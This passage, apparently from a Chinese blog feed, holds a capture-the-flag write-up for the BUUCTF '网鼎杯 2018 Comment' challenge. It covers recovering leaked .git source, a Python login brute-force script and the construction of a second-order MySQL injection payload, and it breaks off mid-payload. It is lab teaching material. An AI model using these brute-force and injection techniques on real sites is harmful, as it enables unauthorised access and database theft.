txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&quot;content&quot;:&quot;ZmxhZ3swYjY3ZmRjMS04ZThjLTQxMWUtOTZlNy1hNjA2ZmMzOWFkM2N9Cg==&quot;&#125;<br></code></pre></td></tr></table></figure><h2 id="解码："><a href="#解码：" class="headerlink" title="解码："></a>解码：</h2><p><img src="/images/2024-2-18/image-20240212215359505.png" alt="image-20240212215359505"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;0b67fdc1-8e8c-411e-96e7-a606fc39ad3c&#125;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{0b67fdc1-8e8c-411e-96e7-a606fc39ad3c}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[网鼎杯 2018]Comment</title>
    <link href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/"/>
    <url>/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105874485">网鼎杯 2018]Comment_[网鼎杯 2018]comment-git泄露部分-CSDN博客</a></p><p>[<a href="https://www.cnblogs.com/Article-kelp/p/16077919.html">BUUCTF题解][网鼎杯 2018]Comment - Article_kelp - 博客园 (cnblogs.com)</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240206185914016.png" alt="image-20240206185914016"></p><h2 id="发一个贴"><a href="#发一个贴" class="headerlink" title="发一个贴:"></a>发一个贴:</h2><p><img src="/images/2024-2-18/image-20240206190135200.png" alt="image-20240206190135200"></p><p><img src="/images/2024-2-18/image-20240206190153951.png" alt="image-20240206190153951"></p><p>跳转到了login.php页面，需要我们先登录，但是我们并不知道账户信息</p><h2 id="使用dirsearch查找后台文件"><a href="#使用dirsearch查找后台文件" class="headerlink" title="使用dirsearch查找后台文件:"></a>使用dirsearch查找后台文件:</h2><p><img src="/images/2024-2-18/image-20240206201103518.png" alt="image-20240206201103518"></p><p>发现大量的.git文件，猜测网页存在.git文件泄露</p><h2 id="使用githack获取泄露文件"><a href="#使用githack获取泄露文件" class="headerlink" title="使用githack获取泄露文件:"></a>使用githack获取泄露文件:</h2><p>kali:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python2 GitHack.py -u http://91de20fb-1487-499f-9de7-6d8134c660b8.node5.buuoj.cn:81/.git<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206215053245.png" alt="image-20240206215053245"></p><h2 id="代码审计分析"><a href="#代码审计分析" class="headerlink" title="代码审计分析:"></a>代码审计分析:</h2><h3 id="write-do-php"><a href="#write-do-php" class="headerlink" title="write_do.php:"></a>write_do.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-comment">// 启动会话，用户保存页面之间的交互信息</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// 先判断用户是否已经登录</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-comment">// 判断参数do是否为空</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="BP抓取发帖的数据包"><a href="#BP抓取发帖的数据包" class="headerlink" title="BP抓取发帖的数据包:"></a>BP抓取发帖的数据包:</h3><p><img src="/images/2024-2-18/image-20240206211820455.png" alt="image-20240206211820455"></p><p><strong>根据我们对web前端的了解，我们要发帖的时候,是启动了write的选项，同时获取了我们的title&amp;category&amp;content三个参数的值，一般来说肯定会有对输入参数的操作，比如写入数据之类的，但是在write_do.php代码中却是空白的内容，这极有可能是.git泄露的文件发生了损坏，我们需要进行修复</strong></p><h3 id="修复-git泄露文件write-do-php："><a href="#修复-git泄露文件write-do-php：" class="headerlink" title="修复.git泄露文件write_do.php："></a>修复.git泄露文件write_do.php：</h3><h4 id="切换到-git泄露文件的保存文件夹目录下"><a href="#切换到-git泄露文件的保存文件夹目录下" class="headerlink" title="切换到.git泄露文件的保存文件夹目录下:"></a>切换到.git泄露文件的保存文件夹目录下:</h4><p><img src="/images/2024-2-18/image-20240206215203379.png" alt="image-20240206215203379"></p><h4 id="在该文件下运行一下命令："><a href="#在该文件下运行一下命令：" class="headerlink" title="在该文件下运行一下命令："></a>在该文件下运行一下命令：</h4><p><strong>该命令用于查看：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">git log --all<br>或<br>git log --reflog<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206215452510.png" alt="image-20240206215452510"></p><p>root用户最后提交的文件信息中有write_do.php，可能对该文件有更加完整的修改，我们可以恢复一下最后的文件</p><h4 id="使用以下命令恢复最后提交的文件"><a href="#使用以下命令恢复最后提交的文件" class="headerlink" title="使用以下命令恢复最后提交的文件:"></a>使用以下命令恢复最后提交的文件:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206221723755.png" alt="image-20240206221723755"></p><h4 id="再次查看当前文件夹下的write-do-php："><a href="#再次查看当前文件夹下的write-do-php：" class="headerlink" title="再次查看当前文件夹下的write_do.php："></a>再次查看当前文件夹下的write_do.php：</h4><p><img src="/images/2024-2-18/image-20240206221658271.png" alt="image-20240206221658271"></p><p><img src="/images/2024-2-18/image-20240206221854959.png" alt="image-20240206221854959"></p><p>文件内容被修复了！！！</p><h4 id="完整的write-do-php："><a href="#完整的write-do-php：" class="headerlink" title="完整的write_do.php："></a>完整的write_do.php：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="登录系统"><a href="#登录系统" class="headerlink" title="登录系统:"></a>登录系统:</h2><p><img src="/images/2024-2-18/image-20240208150050832.png" alt="image-20240208150050832"></p><p>由于我们在对数据库的操作之前必须要先登录系统，所以我们要先尝试登录它，根据登录页面，我们发现用户名框显示zhangwei,密码框显示zhangwei***，一开始我以为是账户的输入格式，但是看了大佬的wp知道这是作者给的提示，账户名是zhangwei,密码是zhangwei***,***是被保密的内容，可能为三个数字，或者三个字母等情况，所以需要我们去爆破</p><h3 id="猜测-是数字："><a href="#猜测-是数字：" class="headerlink" title="猜测***是数字："></a>猜测***是数字：</h3><h4 id="密码爆破脚本"><a href="#密码爆破脚本" class="headerlink" title="密码爆破脚本:"></a>密码爆破脚本:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">&quot;http://4d72a730-6e40-40d9-871b-ebf645b86e7c.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># 将数字的长度补成长度为3的字符串</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">num</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">3</span>-<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(num))))+<span class="hljs-built_in">str</span>(num)<br><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">333</span>,<span class="hljs-number">1000</span>):<br>    passwd = change(num)<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;zhangwei&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;zhangwei&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd)<br>    &#125;<br>    resp = res.post(url=url, data=data)<br>    <span class="hljs-comment"># 用响应数据包的长度来判断正确密码</span><br>    <span class="hljs-comment"># 设置登录失败的长度，可以先注释该代码查看失败的数据包长度，再启用</span><br>    fail_len = <span class="hljs-number">1722</span><br>    <span class="hljs-built_in">print</span>(passwd + <span class="hljs-string">&#x27;=&gt;&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(resp.text)))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(resp.text)!=fail_len):<br>        <span class="hljs-keyword">break</span><br>    <br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208163528399.png" alt="image-20240208163528399"></p><p>最终得到666所反应得数据包长度不同，那么它就是***</p><p><img src="/images/2024-2-18/image-20240208163455987.png" alt="image-20240208163455987"></p><p>成功登录！！！</p><h2 id="随便发一个贴："><a href="#随便发一个贴：" class="headerlink" title="随便发一个贴："></a>随便发一个贴：</h2><p><img src="/images/2024-2-18/image-20240208163808384.png" alt="image-20240208163808384"></p><h3 id="点击详情查看一下："><a href="#点击详情查看一下：" class="headerlink" title="点击详情查看一下："></a>点击详情查看一下：</h3><p><img src="/images/2024-2-18/image-20240208164903572.png" alt="image-20240208164903572"></p><h3 id="提交一下我们得留言"><a href="#提交一下我们得留言" class="headerlink" title="提交一下我们得留言:"></a>提交一下我们得留言:</h3><p><img src="/images/2024-2-18/image-20240208164920824.png" alt="image-20240208164920824"></p><p><img src="/images/2024-2-18/image-20240208164947387.png" alt="image-20240208164947387"></p><p>发现我们的留言被显示出来了。</p><h3 id="根据业务重新代码审计"><a href="#根据业务重新代码审计" class="headerlink" title="根据业务重新代码审计:"></a>根据业务重新代码审计:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-comment">// 为post获取的category中的字符串的特殊字符添加转义\,使得字符串内容在sql语句中不会有一些危险操作，即使字符串中的内容只作为sql语句中的内容</span><br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<span class="hljs-comment"># 正文内容</span><br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<span class="hljs-comment"># 标题</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<span class="hljs-comment"># 留言内容</span><br>    <span class="hljs-comment">// 插入语句的定义</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-comment">// 执行sql语句，返回结果集或布尔值</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-comment">// 想要查看得留言记录得id(点击详情)</span><br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-comment">// 执行sql语句</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-comment">// 获取结果集的记录数量</span><br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// 获取结果集中category字段的值</span><br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-comment">// 获取content内容，获取留言内容</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-comment">// 将内容插入sql语句</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">这里的正文和留言内容以及title都可以显示我们之前输入的内容，这些内容全部是从数据库中查找出来的，如果我们输入的内容是我们对数据库的攻击信息，那是不是有可能会将数据库信息显示到网页上。<br></code></pre></td></tr></table></figure><h3 id="利用（mysql的二次注入）"><a href="#利用（mysql的二次注入）" class="headerlink" title="利用（mysql的二次注入）:"></a>利用（mysql的二次注入）:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql的二次注入攻击是利用insert语句不对用户输入的内容进行过滤检查，将用户输入的内容插入数据库中后，在页面上又通过select语句将数据库内容显示到网页上，从而让攻击者获取内部信息的攻击方式。<br>这里有三个注入点可以进行insert插入:category,title,content<br><br>同时这三个注入点的内容全部都会被显示到comment.php页面上，所以理论上这三个注入点都可以进行注入，但是由于我们写入的攻击sql语句是要被数据库执行的，所以不能被&#x27;&#x27;或&quot;&quot;包裹，所以最好的方式是直接写入sql语句中，所以会选择insert语句中的非最后一个参数点进行写入危险代码，但是由于这三个参数在write页面上都会对传入的字符串做加\的处理，所以在write页面以及comment界面传危险代码进入数据库都不会被执行，会被当做字符串存入数据库<br><br>\字符在被存入数据库的过程中会被自动去除，所以再取出来的字符串就是不带\,而如果这个时候再被插入数据库，危险代码就会被执行，再通过select查询，就可以获取到数据库信息。<br></code></pre></td></tr></table></figure><h4 id="payload构造分析："><a href="#payload构造分析：" class="headerlink" title="payload构造分析："></a>payload构造分析：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs txt">我们要利用数据库内容再取出来不带\的性质注入危险代码，所以要从再取出的注入点观察:<br>$bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);<br>    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;<br>    // 执行sql语句<br>    $result = mysql_query($sql);<br>    // 获取结果集的记录数量<br>    $num = mysql_num_rows($result);<br>    if($num&gt;0)&#123;<br>        // 获取结果集中category字段的值<br>    $category = mysql_fetch_array($result)[&#x27;category&#x27;];<br>    // 获取content内容，获取留言内容<br>    $content = addslashes($_POST[&#x27;content&#x27;]);<br>    // 将内容插入sql语句<br>    $sql = &quot;insert into comment<br>            set category = &#x27;$category&#x27;,<br>                content = &#x27;$content&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br>$category的内容可以从数据库中再取出，所以$category是可以利用的注入点,同时该sql语句中会展示的页面是comment页面，该页面会展示$category和$content内容，我们让content作为信息展示点。<br><br>write界面在$category参数上进行注入:<br>$category = 123&#x27;,content = database(),/*<br>$title=666<br>$content=666<br>$sql = &quot;insert into board<br>            set category = &#x27;$category&#x27;,<br>                title = &#x27;$title&#x27;,<br>                content = &#x27;$content&#x27;&quot;;<br>=&gt;<br> $sql = &quot;insert into board<br>            set category = &#x27;123\&#x27;,content=database(),/*&#x27;,<br>                title = &#x27;666&#x27;,<br>                content = &#x27;666&#x27;&quot;;<br> =&gt;<br>执行的sql语句就是：<br>insert into board<br>            set category = &#x27;123\&#x27;,content=database(),/*&#x27;,<br>                title = &#x27;666&#x27;,<br>                content = &#x27;666&#x27;<br>123\&#x27;,content=database();/*被插入category字段中<br><br>comment界面重新发表留言:<br>$category=mysql_fetch_array($result)[&#x27;category&#x27;];=123&#x27;,content=database(),/*被插入category<br>//被重新取出数据库后，由于数据库自动去除\，所以不带\<br>$content=666<br>$sql = &quot;insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br>然后执行整个sql语句:<br>insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = 